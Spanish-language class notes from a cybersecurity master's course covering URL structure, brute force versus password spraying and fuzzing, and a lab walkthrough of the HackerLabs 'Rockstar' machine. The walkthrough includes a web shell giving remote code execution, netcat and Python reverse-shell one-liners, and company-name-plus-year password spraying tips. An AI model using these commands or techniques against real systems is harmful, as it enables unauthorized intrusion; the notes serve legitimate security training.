> [!info] Ficha tÃ©cnica
> **MÃ¡ster de Ciberseguridad e Inteligencia Artificial** Â· **Clase 39**
> **MÃ³dulo:** MODULO3
> **Tema:** Clase 39
> **Fuente:** Apuntes Joselu Â· Evolve Academy

> [!tip] CÃ³mo leer estos apuntes
> Resumen estructurado de la clase 39. Contenido optimizado para estudio activo y repaso rÃ¡pido antes de exÃ¡menes.

---

---

--
**MÃ¡ster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy**

## 1.

Contexto y estructura de la sesiÃ³n

Esta sesiÃ³n la imparte **Dani** (Carlos).

Es la Ãºltima clase de la convocatoria --- el grupo que toma el examen del eJPT el sÃ¡bado lo harÃ¡ con el mÃ¡ster reciÃ©n cerrado.

La clase tiene dos bloques diferenciados:

1. **TeorÃ­a profunda** sobre conceptos que quedaron confusos: anatomÃ­a de la URL, diferencia entre fuerza bruta, password spraying, directory listing y fuzzing. 2. **PrÃ¡ctica** con la mÃ¡quina **Rockstar** de HackerLabs (mientras se descargaba otra mÃ¡quina), ejecutada por Mariana en vivo.

**Aviso de la academia:** Ãlvaro (equipo de Evolve) estÃ¡ recopilando los apuntes de Chema para que el equipo de maquetaciÃ³n los procese y queden disponibles como recursos oficiales en el campus para todos los alumnos.

## 2.

AnatomÃ­a de una URL --- anÃ¡lisis sintÃ¡ctico completo

Dani abre con un ejercicio de "anÃ¡lisis sintÃ¡ctico" de URL, porque los alumnos usaban los tÃ©rminos de forma imprecisa.

### Estructura de una URL

https://amazon.es/carlos-es-el-mejor?q=verdad&lang=es â†‘ â†‘ â†‘ â†‘ â†‘ protocolo dominio directorio parÃ¡metro variable=valor (TLD)

Componente Ejemplo DescripciÃ³n
-------------------- ----------------------- -------------------------------------------------------------------------------------------------------------------------------
**Protocolo** `https://` Define cÃ³mo viaja la comunicaciÃ³n.

Puede ser HTTP, HTTPS, FTP, SSH, SMB...

El `S` de HTTPS es el subprotocolo TLS sobre TCP/IP
 **TLD** `.es`, `.com`, `.mx` Indica la procedencia/tipo de dominio. `.es` = EspaÃ±a, `.mx` = MÃ©xico, `.com` = global
 `://` `://` Sintaxis arbitraria definida en los orÃ­genes de Internet --- sin significado tÃ©cnico especial
 **Directorio** `/carlos-es-el-mejor` La ruta dentro del servidor.

Cada directorio = un endpoint diferente
 `?` (interrogante) `?` Marca el inicio de los parÃ¡metros.

Solo aparece UNA vez en la URL, antes del primer parÃ¡metro
 **ParÃ¡metro** `q=verdad` Par `variable=valor`.

El parÃ¡metro es la variable (`q`), el valor es lo que se le asigna (`verdad`)
 `&` (ampersand) `&lang=es` Separador entre parÃ¡metros adicionales.

No va precedido de `?` --- solo el primer parÃ¡metro lleva `?`.

**Sintaxis correcta con mÃºltiples parÃ¡metros:**

http://dominio.com/directorio?param1=valor1&param2=valor2&param3=valor3 â†‘ solo un ? â†‘ ampersand â†‘ ampersand

> [!important] ### La distinciÃ³n clave: directorio vs.Â parÃ¡metro vs.Â variable

- **Directorio:** la ruta (`/wordpress/wp-login.php`) --- define el endpoint.
- **ParÃ¡metro:** la variable en la URL (`?username=`) --- define quÃ© dato se envÃ­a.
- **Variable (valor):** el contenido del parÃ¡metro (`=admin`) --- define el valor enviado.

Esta distinciÃ³n es la base para entender quÃ© constituye fuerza bruta y quÃ© no.

## 3.

Fuerza bruta, password spraying, directory listing y fuzzing --- la distinciÃ³n definitiva

### Fuerza bruta clÃ¡sica

**DefiniciÃ³n:** lanzar mÃºltiples intentos sobre **el mismo endpoint** (mismo directorio, mismo parÃ¡metro).

http://dominio.com/wp-login.php?user=VALOR1 â†’ mismo endpoint http://dominio.com/wp-login.php?user=VALOR2 â†’ mismo endpoint http://dominio.com/wp-login.php?user=VALOR3 â†’ mismo endpoint

El servidor (o el WAF) detecta mÃºltiples peticiones al mismo endpoint y activa el **rate limit** â†’ bloqueo del usuario o de la IP.

**Por quÃ© la fuerza bruta es el ÃšLTIMO recurso:**

Dani muestra la tabla exponencial de tiempos de cracking:

Longitud Tipo Tiempo estimado
 ---------- --------------------------- -----------------
6 chars Solo nÃºmeros 6 segundos 8 chars AlfanumÃ©rico 7 minutos 10 chars AlfanumÃ©rico 51 aÃ±os 12 chars AlfanumÃ©rico 800.000 aÃ±os 14 chars AlfanumÃ©rico + especiales 200.000.000 aÃ±os

AdemÃ¡s, no se llega directamente a los 14 caracteres --- hay que sumar todos los tiempos de longitudes menores.

Incluso con delays de solo 2 minutos entre peticiones, lanzar una fuerza bruta completa sobre una contraseÃ±a real es completamente inviable.

### Password spraying --- lo opuesto a la fuerza bruta

**DefiniciÃ³n:** probar **la misma contraseÃ±a** contra **todos los usuarios** (endpoints diferentes).

Luego pasar a la siguiente contraseÃ±a.

Usuario1 â†’ "AbogadosPlus2026" â†’ endpoint diferente Usuario2 â†’ "AbogadosPlus2026" â†’ endpoint diferente Usuario3 â†’ "AbogadosPlus2026" â†’ endpoint diferente ...

**Por quÃ© no activa el rate limit:** cada usuario es un endpoint diferente.

Al pasar de usuario en usuario, el contador de intentos se reinicia.

**CÃ¡lculo del delay necesario:**

El rate limit tÃ­pico en web y AD es **3 intentos cada 5 minutos** (â‰ˆ1 intento cada 100 segundos).

- Con 5.000 usuarios y NetExec (\~0,5 segundos/peticiÃ³n): 2.500 segundos â‰ˆ 42 minutos por vuelta â†’ sin delay necesario (ya ha pasado mÃ¡s de 5 minutos).
- Con 6 usuarios: la vuelta completa dura 3 segundos â†’ activarÃ­a el rate limit â†’ aÃ±adir \~15 segundos de delay por peticiÃ³n.

**Por quÃ© el password spraying siempre da resultado:**

En cualquier empresa, la contraseÃ±a mÃ¡s frecuente es el nombre de la empresa + aÃ±o.

Ejemplo real de Dani con "Abogados Plus" (700 empleados): las 4 combinaciones `AbogadosPlus2026`, `AbogadosPlus2026!`, `AbogadosPlus2025`, `AbogadosPlus2025!` dieron resultado positivo en al menos el 25% de los usuarios. **En ninguna auditorÃ­a real donde se haya probado el nombre de la empresa + aÃ±o ha fallado.**

**El password spraying es lo PRIMERO que debe hacerse en una auditorÃ­a** (al contrario de la fuerza bruta, que es lo Ãºltimo).

### Directory listing --- por quÃ© no es fuerza bruta

**DefiniciÃ³n:** enumerar directorios de una web con un diccionario.

http://dominio.com/admin â†’ endpoint diferente http://dominio.com/login â†’ endpoint diferente http://dominio.com/uploads â†’ endpoint diferente

Cada directorio es un endpoint diferente â†’ no hay rate limit por nÃºmero de intentos al mismo endpoint.

El servidor ve muchas peticiones a rutas distintas, lo que es un comportamiento normal (un usuario navegando visita mÃºltiples rutas).

**Herramientas de directory listing:** dirsearch, DirBuster, GoBuster, Feroxbuster, FFUF.

Todas hacen lo mismo con el mismo diccionario --- la diferencia es el diccionario por defecto y la interfaz.

### Fuzzing --- lo mejor de los dos mundos

**DefiniciÃ³n:** tÃ©cnica que coloca el marcador `FUZZ` en **cualquier posiciÃ³n** de la URL y lo sustituye por cada elemento de un diccionario.

FUZZ.dominio.com â†’ busca subdominios dominio.com/FUZZ â†’ busca directorios dominio.com/dir?param=FUZZ â†’ busca valores de parÃ¡metros dominio.com/dir?FUZZ=valor â†’ busca parÃ¡metros ocultos

**Ventaja sobre directory listing:** el directory listing solo puede iterar sobre la parte del directorio.

El fuzzing puede colocarse en cualquier parte de la URL --- directorios, subdominios, parÃ¡metros o variables --- con la misma herramienta (**FFUF**).

**CuÃ¡ndo usar fuzzing vs.Â directory listing:** - Por defecto: lanzar siempre un dirsearch recursivo con `-r`. - Si no encuentras nada o la pÃ¡gina parece tener algo oculto: lanzar FFUF apuntando al elemento sospechoso. - En CTFs donde no aparece nada: muy probable que haya un subdominio, parÃ¡metro oculto o directorio no incluido en el diccionario estÃ¡ndar â†’ fuzzing.

**Herramienta para enumerar parÃ¡metros ocultos:** `x8` --- herramienta especializada en descubrir parÃ¡metros de URL que no estÃ¡n documentados ni son accesibles por fuzzing normal de directorios.

## 4.

MetodologÃ­a web consolidada

Dani consolida la metodologÃ­a que han ido construyendo a lo largo del mÃ³dulo:

Nmap â†’ puerto 80/443 con HTTP â†“ Directory listing (siempre, con -r recursivo) â†“ Si CMS â†’ herramienta especÃ­fica (WordPress=WPScan, Drupal=Droopescan, Joomla=su propia herramienta) â†“ Mientras tanto â†’ conocer la pÃ¡gina:
- Wappalyzer â†’ tecnologÃ­as y versiones
- CÃ³digo fuente (Ctrl+U) â†’ comentarios, directorios ocultos, usuarios, rutas
- Funcionalidades â†’ buscadores (SQLi), formularios (SQLi, XSS, SSRF), uploads (file upload), descargas PDF (XXE)
â†“ AnÃ¡lisis de vulnerabilidades en orden: Apache â†’ WP core â†’ tema â†’ plugins â†’ librerÃ­as â†“ ExplotaciÃ³n â†’ escalada â†’ persistencia â†’ reporte

â†’

â†’

â†’

**La analogÃ­a de la discoteca (resumen):**

> "Cuando llegas a una discoteca y ves a alguien que te gusta, Â¿le metes boca directamente?

No.

La conoces un poco.

Pues con una web es igual.

No lances exploits a ciegas --- primero conoce: menÃº, buscador, formularios, directorios, uploads, versiones.

Ya sabes que le gusta el tequila.

No le invites al JÃ¤ger."

El **WAF** = el portero de la discoteca.

Si te pasas de pesado (demasiadas peticiones al mismo endpoint), te echan (bloqueo de IP).

## 5.

MÃ¡quina Rockstar (HackerLabs) --- prÃ¡ctica con Mariana

### Reconocimiento inicial

ping IP # Verificar conectividad nmap -sCV IP # Nmap con versiones y scripts

### Puerto encontrado: **80** (HTTP, Apache 2.4.18).

**Si la web no carga (error de DNS):** significa que usa un dominio personalizado â†’ editar `/etc/hosts` y aÃ±adir `IP dominio.th1`.

### Fuzzing de directorios

dirsearch -u http://IP/

### Resultados relevantes: - `/php/` â†’ directorio accesible con ficheros PHP. - `/js/` â†’ directorio con JavaScript. - `/uploads/` â†’ directorio accesible (potencial carpeta de ejecuciÃ³n). - `/dev/` â†’ directorio con los ficheros `bas.php` y `php.min.jpg`.

### AnÃ¡lisis del cÃ³digo fuente

`Ctrl+U` en el navegador â†’ se encontrÃ³ un enlace a un repositorio **GitHub** con una screenshot similar a la pÃ¡gina.

El README del repositorio decÃ­a que el servidor tenÃ­a ese PHP instalado --- revelando el vector de ataque.

### Identificar usuarios desde la web

En la pÃ¡gina `/about.html` aparecÃ­a el nombre del autor: **Jen Marshall**.

Un nombre de autor en un blog = posible nombre de usuario del sistema (`jen`, `jmarshall`, `jenmarshall`, `jen_m`...).

Anotarlo como candidato para fuerza bruta posterior.

### Apache 2.4.18 --- CVEs disponibles pero no Ãºtiles en este contexto

Al buscar `Apache 2.4.18 vulnerabilidades`, aparecen CVEs (Mod LDAP, Mod Proxy, buffer overflow, etc.).

Proceso de filtrado: - CVE con LDAP â†’ requiere Directorio Activo en la mÃ¡quina, descartado. - CVE con XSS stored â†’ requiere interacciÃ³n de otro usuario, descartado (solo un usuario activo). - Buffer overflow â†’ demasiado avanzado para Easy/Medium, descartado. - CVEs de 2014 â†’ descartados por antigÃ¼edad sin ningÃºn servicio relacionado.

**ConclusiÃ³n:** cuando en una mÃ¡quina Easy/Medium no funcionan los primeros vectores obvios, la vulnerabilidad no estÃ¡ en Apache.

Anotarlo y seguir.

### `/dev/` --- el hallazgo clave

El directorio `/dev/` contenÃ­a: - `bas.php` â†’ al cargarlo en el navegador mostraba una **shell web**. - `php.min.jpg` â†’ imagen con el cÃ³digo PHP de la herramienta.

**CÃ³mo leer el cÃ³digo PHP sin que el servidor lo ejecute:** - Ficheros `.php` â†’ el servidor los ejecuta al visitarlos, nunca muestra el cÃ³digo. - Ficheros `.html`, `.js`, `.jpg` â†’ el servidor sirve el contenido en texto/bytes. - Para ver el cÃ³digo PHP hay que descargarlo o encontrar la versiÃ³n `.jpg`.

**Uso de Claude para analizar el cÃ³digo:** Carlos mostrÃ³ cÃ³mo pegar el cÃ³digo PHP directamente en Claude (Claude Opus 4.8, accesible en clase) pidiendo analizar vulnerabilidades.

La respuesta confirmÃ³: **RCE sin autenticaciÃ³n** --- cualquiera que acceda al fichero puede ejecutar comandos arbitrarios como el usuario del servidor web.

Criticidad: crÃ­tica.

### Shell web â†’ RCE confirmado

# En el navegador, al acceder a http://IP/dev/bas.php

# â†’ aparece un campo de texto con interfaz de shell

whoami # â†’ www-data ls # â†’ lista el contenido de /var/www/html

### Escalar a reverse shell con Netcat

El servidor tenÃ­a Netcat instalado (`/bin/nc`):

# Verificar navegando en la shell:

```bash
cd / cd bin ls | grep nc # â†’ nc existe
```

# Python tambiÃ©n disponible:

python -V # â†’ Python 2.x o 3.x confirmado

Con Netcat y Python disponibles, se puede lanzar una reverse shell estabilizada:

# En Kali — poner Netcat a escuchar

nc -lvnp 4444

# En la shell web — lanzar la reverse shell

nc -e /bin/bash NUESTRA_IP 4444

# O con Python si nc no admite -e:

python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

### Por quÃ© no usar la webshell del servidor directamente

Una shell web es Ãºtil para reconocimiento puntual, pero tiene limitaciones serias: - No tiene historial de comandos. - No permite usar editores de texto. - Ctrl+C mata la sesiÃ³n. - No tiene autocompletado. - Los errores de comandos no se muestran correctamente.

Una reverse shell con Netcat + estabilizaciÃ³n (`python3 pty` + `stty raw -echo`) es siempre preferible para post-explotaciÃ³n real.

## 6.

PHP en el servidor --- concepto clave

Al acceder a un fichero `.php` desde el navegador, el servidor **ejecuta el cÃ³digo y devuelve el resultado**, no el cÃ³digo fuente.

Si el PHP no produce ningÃºn output visible (no tiene `echo` ni `print`), la pÃ¡gina se muestra en **blanco** (0 bytes).

Eso NO significa que no haya hecho nada --- el cÃ³digo se ejecutÃ³ igualmente.

**Contraste:** - `.html` â†’ se devuelve como texto plano (el navegador lo renderiza). - `.js` â†’ se devuelve como texto plano (el navegador lo ejecuta como JavaScript). - `.php` â†’ el servidor lo ejecuta y devuelve Ãºnicamente el resultado.

## 7.

Resumen de la distinciÃ³n entre tÃ©cnicas de enumeraciÃ³n

TÃ©cnica VarÃ­a Activa rate limit CuÃ¡ndo usarla
----------------------- ---------------------------------------------------------------------------- ---------------------------------- ----------------------------------------------------------
 **Fuerza bruta** Valor de un parÃ¡metro/contraseÃ±a en el mismo endpoint SÃ Ãšltimo recurso
 **Password spraying** Usuario (endpoint diferente), misma contraseÃ±a NO PRIMERA opciÃ³n en auditorÃ­as con mÃºltiples usuarios
 **Directory listing** Directorio (endpoint diferente) NO Siempre, en cada web
**Fuzzing** Cualquier posiciÃ³n de la URL (directorio, subdominio, parÃ¡metro, variable) Depende de dÃ³nde se coloque FUZZ Cuando directory listing no basta o hay elementos ocultos

## 8.

Conceptos y tÃ©rminos clave corregidos

TÃ©rmino en la transcripciÃ³n CorrecciÃ³n / AclaraciÃ³n
--------------------------------------------------------- ------------------------------------------------------------------------------------------------------------
 *URL, una URL* **URL** (*Uniform Resource Locator*) -- direcciÃ³n completa de un recurso web
 *el punto es / punto com* **TLD** (*Top-Level Domain*) -- el dominio de nivel superior (`.es`, `.com`, `.mx`...)
 *el interrogante / la pregunta en la URL* `?` -- marca el inicio de los parÃ¡metros en una URL; aparece solo una vez
 *ampersand / number sand / el and* `&` (*ampersand*) -- separador entre parÃ¡metros en una URL
 *parÃ¡metro / variable / valor* **ParÃ¡metro** = la variable (`q`); **valor** = lo que se le asigna (`verdad`).

Ej: `?q=verdad`
 *directory listing / listar directorios* **Directory listing / fuzzing de directorios** -- enumerar rutas de una web con un diccionario
 *FUZZ / FUF / FF Food* **FFUF** (*Fuzz Faster U Fool*) -- herramienta de fuzzing web con marcador FUZZ
 *X 8 / x8 / la x ocho* **x8** -- herramienta para enumerar parÃ¡metros ocultos en URLs
 *footing / foozing / fusear / footing* **Fuzzing** -- tÃ©cnica que coloca el marcador FUZZ en cualquier posiciÃ³n de la URL
 *password spreading / spray attack / Powerwall Playing* **Password Spraying** -- probar la misma contraseÃ±a contra mÃºltiples usuarios
 *Deep Buster / Devuster* **DirBuster** -- herramienta y diccionario de fuzzing web
 *Big Bovuster / GoBuster* **Gobuster** -- herramienta de fuzzing web de directorios
 *FerochBuster / Flexbuster* **Feroxbuster** -- herramienta de fuzzing web recursivo
*rate limit / reilimit / raiglimit / readlimit* **Rate limit** -- nÃºmero mÃ¡ximo de intentos por unidad de tiempo; protecciÃ³n contra ataques de fuerza bruta
 *Drupscan / la herramienta de Drupal* **Droopescan** -- herramienta de auditorÃ­a para Drupal (equivalente a WPScan)
 *el Juan May / Juan Mai* `whoami` -- comando que muestra el usuario actual
 *NetCAD / Net Card / Netcard* **Netcat** -- herramienta de comunicaciÃ³n TCP/UDP; `nc -lvnp 4444` para listener
 *Wapaalizar / Wappalizer* **Wappalyzer** -- extensiÃ³n del navegador para detectar tecnologÃ­as web
 *Burp suite / por Swinger / Bursuite* **Burp Suite** -- framework de auditorÃ­a web (proxy + intruder + repeater + decoder...)
 *WW Data / w w data* `www-data` -- cuenta de servicio del servidor web Apache en Linux
 *barra var barra www barra HTML* `/var/www/html` -- directorio raÃ­z por defecto de un servidor Apache en Linux
 *Claudia / Claudiol / cloud de Anthropic* **Claude** (Anthropic) -- IA usada en clase para analizar el cÃ³digo PHP y detectar la vulnerabilidad RCE
 *el de Opus / 4 8 / Opus 4 8* **Claude Opus 4.8** -- modelo de Claude usado en la demo de anÃ¡lisis del cÃ³digo vulnerable
 *la mÃ¡quina de Rockstar / Rockstar* **Rockstar** -- mÃ¡quina de HackerLabs con un PHP vulnerable a RCE sin autenticaciÃ³n
 *HackerLabs / Hacker Labs / el de the hacker labs* **HackerLabs** (hackerlabs.academy) -- plataforma de mÃ¡quinas vulnerables web

*Resumen elaborado para uso acadÃ©mico en el MÃ¡ster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.*

â†’

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Chema/Repaso de Enumeración Web.md|Repaso de Enumeración Web]— GoBuster, SSH, XSS
- [[../../apuntes Chema/Maquinas/Auditoría de CMS — WordPress (máquina Academy).md|Auditoría de CMS — WordPress (máquina Academy)]— GoBuster, SSH, XSS
- [[../../Apuntes/05 - Auditoria Web/Repaso de Enumeración Web.md|Repaso de Enumeración Web]— Feroxbuster, GoBuster, XSS
- [[resumen_master_clase38.md|resumen_master_clase38]— Kali Linux, SSH, XSS
- [[../../write-ups/Academy-THL.md|Academy-THL]— Kali Linux, Reverse Shells, SSH
- [[../../Apuntes/05 - Auditoria Web/Auditoria Web — Práctica con Metasploitable.md|Auditoria Web — Práctica con Metasploitable]— GoBuster, Kali Linux, SSH

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/DirSearch|DirSearch]]
- [[comandos/Feroxbuster|Feroxbuster]]
- [[comandos/FFUF|FFUF]]
- [[comandos/GoBuster|GoBuster]]
- [[comandos/Hydra|Hydra]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SMB_Impacket|SMB / Impacket]]
- [[comandos/SSH|SSH]]
- [[comandos/WPScan|WPScan]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
- [[Apuntes/05 - Auditoria Web/SSRF — Server-Side Request Forgery.md|SSRF]]
- [[Apuntes/05 - Auditoria Web/Vulnerabilidades Web — OWASP Top 10 y Burp Suite.md|XSS]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #burpsuite #certificaciones #command-injection #dirsearch #feroxbuster #ffuf #file-upload #gobuster #hydra #ia #kali #linux #netcat #nmap #redes #reverse-shell #smb-impacket #sqli #ssh #ssrf #wordpress #wpscan #xss #xxe
